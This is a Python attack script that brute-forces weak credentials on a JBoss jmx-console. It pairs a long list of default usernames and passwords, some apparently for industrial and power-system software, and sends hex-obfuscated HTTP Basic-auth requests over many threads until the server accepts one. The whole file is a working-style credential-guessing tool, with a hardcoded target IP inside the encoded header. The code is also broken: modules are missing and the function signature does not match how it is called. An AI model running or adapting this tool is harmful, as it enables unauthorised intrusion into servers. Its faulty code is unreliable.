#encoding:utf-8
try:
    import os
    import socket
    import base64
    import binascii
except:
    os._exit(6)



Is_True = False
username_list=['root', "pocosin",'111', 'ems', 'oracle', 'sifang', 'sunri', 'tx', 'ut', 'ut1', 'd5000', 'pi3000', 'pi6000', 'oms', 'dky', 'sysadmin', 'netadmin', 'secadmin', 'audadmin', 'mysql', 'dmdbms', 'dmdba', 'kingbase', 'rock', 'rocky', 'h3c', 'h3capadmin', 'superadmin', 'huawei', 'admin', 'administrator', 'anonymous', 'backup', 'ftp', 'guest', 'linux', 'postgres', 'sys', 'system', 'temp', 'test', 'test1', 'tomcat', 'upload', 'user', 'user1', 'web', 'www']
password_list=['@123qwe!@#QWE', 'test', 'root', 'toor', 'su-4000361515', 'sf-4000361515', 'oracle', 'nr2000', 'root123', 'qwer1234', 'narins2000', 'Nems-9700', 'Abc123', 'Nroot-9700', '123456', 'ut', 'UT#2015', 'UT#20150306', 'Ab#20150306', 'q+12345', 'Admin@322', 'ytdf_000', 'ytdf000', '111111', 'sysadmin', 'secadmin', 'audadmin', 'netadmin', 'd5000', 'sysadm', 'netadm', 'secadm', 'audadm', 'dmdbms', 'dmdba', 'kingbase', 'R0ck9', 'pi3000', 'pi6000', 'open3000', 'oms', 'dky', 'rock', 'rocky', 'h3c', 'h3capadmin', 'superadmin', 'huawei', 'DEL.123.com', 'Passw0rd', 'qweasdzxc', 'admin123!@#', 'admin', 'admin123', 'admin@123', 'admin#123', 'password', '12345', '1234', '123', 'qwerty', 'test', '1q2w3e4r', '1qaz2wsx', 'qazwsx', '123qwe', '123qaz', '0000', '1234567', '123456qwerty', 'password123', '12345678', '1q2w3e', 'okmnji', 'test123', '123456789', 'postgres', 'q1w2e3r4', 'redhat', 'user', 'mysql', 'apache']
queues = queue.Queue(len(username_list)*len(password_list))
for user in username_list:
    for passwd in password_list:
        queues.put({user:passwd})

def check(ip,port,user,passwd):
    global Is_True
    user_passwd = queues.get()
    check_user_pass =user_passwd.keys()[0] + ':'+user_passwd.values()[0]
    check_user_pass_base64 = base64.b64encode(check_user_pass.encode('utf-8'))
    data1 = b"474554202f6a6d782d636f6e736f6c652f20485454502f312e310d0a486f73743a20312e31352e3130332e3233323a383038300d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a43616368652d436f6e74726f6c3a206d61782d6167653d300d0a417574686f72697a6174696f6e3a20426173696320"
    data2 = b"0d0a444e543a20310d0a557067726164652d496e7365637572652d52657175657374733a20310d0a557365722d4167656e743a204d6f7a696c6c612f352e30202857696e646f7773204e542031302e303b2057696e36343b2078363429204170706c655765624b69742f3533372e333620284b48544d4c2c206c696b65204765636b6f29204368726f6d652f39382e302e343735382e313032205361666172692f3533372e3336204564672f39382e302e313130382e35360d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c696d6167652f776562702c696d6167652f61706e672c2a2f2a3b713d302e382c6170706c69636174696f6e2f7369676e65642d65786368616e67653b763d62333b713d302e390d0a526566657265723a20687474703a2f2f312e31352e3130332e3233323a383038302f0d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a4163636570742d4c616e67756167653a207a682d434e2c7a683b713d302e392c656e3b713d302e382c656e2d47423b713d302e372c656e2d55533b713d302e360d0a436f6f6b69653a204a53455353494f4e49443d30443246384235354439443034304131303534433142323544343342373544430d0a0d0a"
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect((ip,port))
        s.send(binascii.a2b_hex(data1)+check_user_pass_base64+binascii.a2b_hex(data2))
        # s.send(data1)
        get = s.recv(4096)
        if b'JMImplementation'in get:
            print("[+] {} find jboss weak password".format(ip))
            Is_True = True
            queues.queue.clear()
    except Exception as e:
        return False

def main(ip,port):
    while 1:
        if threading.active_count()<=50:
            try:
                ssh_threads = threading.Thread(target=check,args=(ip,port))
                ssh_threads.setDaemon(True)
                ssh_threads.start()
                if (queues.empty()==True) or (Is_True==True):
                    break
            except:
                pass
    if Is_True == True:
        os._exit(1)
    os._exit(2)
if __name__ == "__main__":
    # while queues.empty()!= True:
    #     print(queues.get())
    import sys
    ip = sys.argv[1]
    port = sys.argv[2]
    main(ip,int(port))